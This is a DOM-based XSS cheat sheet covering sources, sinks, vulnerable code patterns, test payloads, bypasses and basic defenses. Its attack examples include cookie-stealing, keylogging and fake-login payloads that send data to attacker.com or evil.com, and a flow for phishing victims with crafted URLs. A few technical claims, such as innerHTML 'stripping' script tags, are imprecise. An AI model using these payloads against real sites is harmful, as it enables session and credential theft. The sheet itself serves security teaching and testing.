# DOM-based XSS Quick Reference

## What is DOM XSS?

**DOM XSS** = XSS processed entirely client-side via JavaScript (never reaches server)

**Characteristics**:
- ❌ NO backend processing
- ❌ NO HTTP requests sent
- ✅ Pure JavaScript/client-side
- ✅ URL uses # (hashtag/fragment)
- ✅ Non-persistent

## Key Difference: DOM vs Reflected vs Stored

| Feature | DOM | Reflected | Stored |
|---------|-----|-----------|--------|
| **Processing** | Client-side | Server-side | Server-side |
| **HTTP Request** | ❌ No | ✅ Yes | ✅ Yes |
| **URL Indicator** | `#` hashtag | `?` query | N/A |
| **Network Traffic** | None | Visible | Visible |
| **Persistence** | ❌ No | ❌ No | ✅ Yes |

## Identifying DOM XSS

### Check 1: URL fragment (#)
```
http://site.com/page#input=test
                    ↑
                Hashtag = Client-side only
```

### Check 2: No HTTP requests
```bash
# Open DevTools (F12) → Network tab
# Submit input
# No requests = DOM XSS
```

### Check 3: Not in page source
```
View Page Source (CTRL+U)
Input NOT found = DOM processing

Inspect Element (CTRL+SHIFT+C)
Input IS found = Rendered after JS execution
```

## Source & Sink Concept

### Source (Input)
**Where user input comes from:**
- `window.location`
- `document.URL`
- `document.referrer`
- `window.name`
- `location.hash`
- `location.search`

### Sink (Output)
**Where input gets written to DOM:**

**Vulnerable Sinks**:
```javascript
// JavaScript
document.write()
document.writeln()
element.innerHTML
element.outerHTML

// jQuery
.html()
.add()
.after()
.append()
.prepend()
```

## Common Vulnerable Code Patterns

### Pattern 1: innerHTML
```javascript
// VULNERABLE
var input = location.hash.substring(1);
document.getElementById("output").innerHTML = input;
```

### Pattern 2: document.write
```javascript
// VULNERABLE
var name = location.search.substring(1);
document.write(name);
```

### Pattern 3: jQuery html()
```javascript
// VULNERABLE
var data = window.location.hash;
$("#output").html(data);
```

### Pattern 4: eval()
```javascript
// VERY VULNERABLE
var code = location.hash.substring(1);
eval(code);
```

## Basic Test Payloads

### Won't Work (innerHTML blocks <script>)
```html
❌ <script>alert(1)</script>
```

### Will Work
```html
<!-- Image tag with onerror -->
✅ <img src=x onerror=alert(1)>

<!-- Image with empty src -->
✅ <img src="" onerror=alert(document.domain)>

<!-- SVG -->
✅ <svg onload=alert(1)>

<!-- iFrame -->
✅ <iframe src=javascript:alert(1)>

<!-- Body -->
✅ <body onload=alert(1)>

<!-- Input with autofocus -->
✅ <input onfocus=alert(1) autofocus>

<!-- Details -->
✅ <details open ontoggle=alert(1)>
```

## Testing Process

### Step 1: Identify Source
```javascript
// Look in page JS for:
location.hash
document.URL
window.location.search
```

### Step 2: Identify Sink
```javascript
// Look for:
innerHTML
document.write
.html()
.append()
```

### Step 3: Test Payload
```
http://target.com/page#task=<img src=x onerror=alert(1)>
```

### Step 4: Verify Execution
- Alert pops = Vulnerable ✅
- Check with F12 → Console for errors

## Common URL Formats

```
# Fragment identifier (most common)
http://site.com/page#input=PAYLOAD

# After hash
http://site.com/#task=PAYLOAD

# Multiple parameters
http://site.com/#name=test&task=PAYLOAD
```

## Example Vulnerable Code

```javascript
// Get input from URL fragment
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);

// Write to DOM without sanitization
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);

// VULNERABLE: No sanitization before innerHTML
```

## Attack Payload Examples

### Cookie Theft
```html
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

### Redirect
```html
<img src=x onerror="window.location='http://attacker.com'">
```

### Phishing
```html
<img src=x onerror="document.body.innerHTML='<h1>Login</h1><form action=http://evil.com><input name=user><input name=pass type=password><button>Login</button></form>'">
```

### Keylogger
```html
<img src=x onerror="document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}">
```

## Detection Methods

### Manual Check
```bash
# 1. Open DevTools (F12)
# 2. Network tab
# 3. Submit input
# 4. No network activity = Possible DOM XSS

# 5. Console tab
# 6. Type: location.hash
# 7. If accessible = Can control input
```

### Source Code Review
```javascript
// Search for:
innerHTML
document.write
location.hash
document.URL
.html()
.append()
```

### Tools
```bash
# DOM Invader (Burp Suite extension)
# Automatically finds DOM XSS

# Manual testing
http://target.com/#param=<img src=x onerror=alert(1)>

# DOMPurify check
# If DOMPurify.sanitize() used = Likely safe
```

## Exploitation Flow

```
1. Find page using URL fragments (#)
   ↓
2. Identify JavaScript source/sink
   ↓
3. Test with: #param=<img src=x onerror=alert(1)>
   ↓
4. Alert pops = Vulnerable
   ↓
5. Craft malicious URL
   ↓
6. Send to victim (phishing)
   ↓
7. Victim clicks → XSS executes
```

## Real-World Example

```javascript
// Vulnerable code
var search = location.hash.substring(1);
document.getElementById("results").innerHTML = "You searched for: " + search;

// Attack URL
http://site.com/search#<img src=x onerror=alert(document.cookie)>

// Result: Cookie theft when victim visits URL
```

## Why <script> Doesn't Work

```javascript
// innerHTML sanitizes <script> tags
element.innerHTML = "<script>alert(1)</script>";
// Result: Script tag stripped, doesn't execute

// Use event handlers instead
element.innerHTML = "<img src=x onerror=alert(1)>";
// Result: Executes successfully
```

## Bypass Techniques

### If innerHTML used
```html
<!-- Don't use <script> -->
❌ <script>alert(1)</script>

<!-- Use event handlers -->
✅ <img src=x onerror=alert(1)>
✅ <svg onload=alert(1)>
✅ <body onload=alert(1)>
```

### If eval() used
```html
<!-- Direct JavaScript execution -->
✅ alert(1)
✅ document.location='http://attacker.com'
```

### URL Encoding
```
# Original
#task=<img src=x onerror=alert(1)>

# Encoded
#task=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

## Finding DOM XSS

### Step-by-step
```bash
# 1. Browse site, look for # in URLs
http://site.com/#anything

# 2. Open DevTools → Network
# 3. Interact with page
# 4. No HTTP requests = DOM-based

# 5. View page source (CTRL+U)
# 6. Search for JavaScript files
# 7. Look for:
location.hash
document.URL
innerHTML
document.write

# 8. Test payload
#param=<img src=x onerror=alert(1)>
```

## Common Sinks (Ranked by Exploitability)

| Sink | Exploitability | Payload Type |
|------|----------------|--------------|
| `eval()` | 🔴 High | Direct JS |
| `document.write()` | 🔴 High | HTML/JS |
| `innerHTML` | 🟡 Medium | HTML only |
| `innerText` | 🟢 Low | Text only |
| `textContent` | 🟢 Low | Text only |

## Defense Check

```javascript
// SAFE (using textContent)
element.textContent = userInput;

// SAFE (DOMPurify)
element.innerHTML = DOMPurify.sanitize(userInput);

// VULNERABLE
element.innerHTML = userInput;
```

## Quick Test Payloads

```html
<!-- Level 1: Basic -->
<img src=x onerror=alert(1)>

<!-- Level 2: No spaces -->
<img/src=x/onerror=alert(1)>

<!-- Level 3: SVG -->
<svg/onload=alert(1)>

<!-- Level 4: Details tag -->
<details open ontoggle=alert(1)>

<!-- Level 5: iFrame -->
<iframe src=javascript:alert(1)>
```

## Verification Checklist

✅ **DOM XSS if**:
- URL uses # (fragment)
- No HTTP requests in Network tab
- Input not in page source (CTRL+U)
- Input visible in Inspector (F12)
- JavaScript processes input
- Payload executes client-side

## Key Points

🔴 **Remember**:
- DOM XSS = 100% client-side
- Look for # in URL
- No network traffic
- `<script>` won't work with innerHTML
- Use event handlers instead

🎯 **Attack Chain**:
```
URL fragment → JavaScript reads → Writes to DOM → No sanitization → XSS
```

## Impact

**High** because:
- ✅ Cookie theft
- ✅ Session hijacking  
- ✅ Phishing
- ✅ Credential theft

**Detection harder** because:
- ❌ No server logs
- ❌ WAF can't inspect
- ❌ No HTTP traffic
